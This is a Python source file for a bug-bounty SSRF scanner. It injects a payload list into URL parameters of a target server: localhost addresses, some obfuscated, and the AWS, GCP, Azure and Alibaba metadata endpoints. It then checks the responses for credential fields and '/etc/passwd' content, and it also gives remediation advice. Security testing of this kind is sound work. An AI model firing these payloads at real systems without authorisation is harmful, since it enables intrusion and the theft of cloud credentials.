"""SSRF detector — tests for Server-Side Request Forgery vulnerabilities.

SSRF pays $500-$25,000 on most bug bounty programs. It allows an attacker
to make the server send requests to internal resources (AWS metadata,
internal APIs, localhost services).
"""
from __future__ import annotations

import asyncio
import re
from typing import Any
from urllib.parse import urlencode, urlparse, parse_qs

import aiohttp

from vulnhunter.models import Severity, ToolResult, Vulnerability
from vulnhunter.tools.base import BaseTool

SSRF_PAYLOADS = [
    ("http://127.0.0.1", "localhost IPv4"),
    ("http://[::1]", "localhost IPv6"),
    ("http://0x7f000001", "localhost hex"),
    ("http://0177.0.0.1", "localhost octal"),
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"),
]

URL_PARAM_NAMES = [
    "url", "uri", "link", "href", "src", "source", "path", "file",
    "redirect", "return", "next", "target", "dest", "destination",
    "go", "fetch", "load", "page", "site", "callback", "proxy",
    "image", "img", "icon", "logo", "avatar", "webhook", "endpoint",
    "feed", "rss", "xml", "import", "export", "download", "upload_url",
    "preview", "template", "config", "api_url", "service_url",
]


class SSRFDetectorTool(BaseTool):
    """Test for Server-Side Request Forgery (SSRF) vulnerabilities."""

    @property
    def name(self) -> str:
        return "ssrf_detector"

    @property
    def description(self) -> str:
        return (
            "Test URL parameters for Server-Side Request Forgery (SSRF). "
            "Checks if the server fetches attacker-controlled URLs by injecting "
            "payloads targeting localhost, AWS/GCP/Azure metadata endpoints, and "
            "internal networks. SSRF pays $500-$25,000 on most programs."
        )

    @property
    def parameters(self) -> dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target URL to test (e.g., https://example.com/fetch?url=https://example.com)",
                },
                "param_name": {
                    "type": "string",
                    "description": "Specific parameter name to test. If empty, auto-detects URL-like parameters.",
                    "default": "",
                },
                "endpoints": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Additional URLs/endpoints to test for SSRF (from recon)",
                    "default": [],
                },
            },
            "required": ["url"],
        }

    async def _execute(self, **kwargs: Any) -> ToolResult:
        url = kwargs["url"]
        param_name = kwargs.get("param_name", "")
        extra_endpoints = kwargs.get("endpoints", [])

        vulns: list[Vulnerability] = []
        findings: list[dict[str, str]] = []

        test_urls = [url] + extra_endpoints[:20]

        for test_url in test_urls:
            parsed = urlparse(test_url)
            params = parse_qs(parsed.query)

            # Determine which params to test
            target_params: list[str] = []
            if param_name:
                target_params = [param_name]
            else:
                for p in params:
                    if p.lower() in URL_PARAM_NAMES:
                        target_params.append(p)
                # If URL has no matching params, try injecting common SSRF params
                if not target_params and not params:
                    target_params = ["url", "link", "src", "callback"]

            for tp in target_params:
                for payload, payload_desc in SSRF_PAYLOADS:
                    result = await self._test_ssrf(test_url, tp, payload, params)
                    if result:
                        findings.append({
                            "url": test_url,
                            "param": tp,
                            "payload": payload,
                            "type": payload_desc,
                            "indicator": result,
                        })
                        severity = Severity.CRITICAL if "metadata" in payload_desc.lower() else Severity.HIGH
                        vulns.append(Vulnerability(
                            title=f"SSRF via '{tp}' parameter ({payload_desc})",
                            severity=severity,
                            tool=self.name,
                            description=(
                                f"Server-Side Request Forgery detected in parameter '{tp}'. "
                                f"The server made a request to {payload} when injected via '{tp}'. "
                                f"Type: {payload_desc}."
                            ),
                            evidence=f"URL: {test_url}\nParameter: {tp}\nPayload: {payload}\nIndicator: {result}",
                            cwe_id="CWE-918",
                            remediation=(
                                "Validate and sanitize all URL inputs. Use an allowlist of permitted "
                                "domains/IPs. Block requests to private IP ranges (127.0.0.0/8, "
                                "10.0.0.0/8, 169.254.169.254, etc.). Disable unnecessary URL schemes."
                            ),
                        ))
                        break  # One finding per param is enough

        raw = f"SSRF scan of {len(test_urls)} URL(s), tested {len(URL_PARAM_NAMES)} param names\n"
        if findings:
            raw += f"VULNERABLE: {len(findings)} SSRF finding(s):\n"
            for f in findings:
                raw += f"  [{f['type']}] {f['param']} @ {f['url']}\n"
        else:
            raw += "No SSRF vulnerabilities detected with automated payloads.\n"
            raw += "Note: Blind SSRF requires out-of-band callback verification.\n"

        return ToolResult(
            tool_name=self.name,
            success=True,
            data={"findings": findings, "total": len(findings)},
            raw_output=raw,
            vulnerabilities=vulns,
        )

    async def _test_ssrf(
        self, url: str, param: str, payload: str, existing_params: dict
    ) -> str:
        """Test a single SSRF payload. Returns indicator string if vulnerable."""
        parsed = urlparse(url)
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in existing_params.items()}
        test_params[param] = payload

        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

        try:
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=10),
                headers={"User-Agent": "Mozilla/5.0 (compatible; VulnHunter/2.0)"},
            ) as session:
                async with session.get(test_url, ssl=False, allow_redirects=False) as resp:
                    body = await resp.text(errors="replace")
                    return self._detect_ssrf_indicators(body, resp.status, resp.headers, payload)
        except Exception:
            return ""

    @staticmethod
    def _detect_ssrf_indicators(
        body: str, status: int, headers: Any, payload: str
    ) -> str:
        """Detect indicators that the server actually fetched the SSRF payload."""
        body_lower = body.lower()

        # AWS metadata indicators
        if "169.254.169.254" in payload:
            aws_indicators = ["ami-id", "instance-id", "instance-type", "iam", "security-credentials"]
            for ind in aws_indicators:
                if ind in body_lower:
                    return f"AWS metadata field '{ind}' in response"

        # GCP metadata
        if "metadata.google.internal" in payload:
            gcp_indicators = ["project-id", "zone", "machine-type", "service-accounts"]
            for ind in gcp_indicators:
                if ind in body_lower:
                    return f"GCP metadata field '{ind}' in response"

        # Localhost indicators
        if "127.0.0.1" in payload or "::1" in payload or "0x7f" in payload or "0177" in payload:
            localhost_indicators = [
                "apache", "nginx", "iis", "server at localhost",
                "it works", "welcome to", "default page",
                "phpinfo()", "php version", "configuration",
            ]
            for ind in localhost_indicators:
                if ind in body_lower:
                    return f"Localhost content indicator: '{ind}'"

        # Generic: response contains content from internal resource
        if status == 200 and len(body) > 100:
            # Check if response looks different from normal error
            if "error" not in body_lower and "not found" not in body_lower:
                internal_indicators = [
                    "root:", "/etc/passwd", "daemon:", "internal server",
                    "x-powered-by", "private", "intranet",
                ]
                for ind in internal_indicators:
                    if ind in body_lower:
                        return f"Internal content indicator: '{ind}'"

        return ""
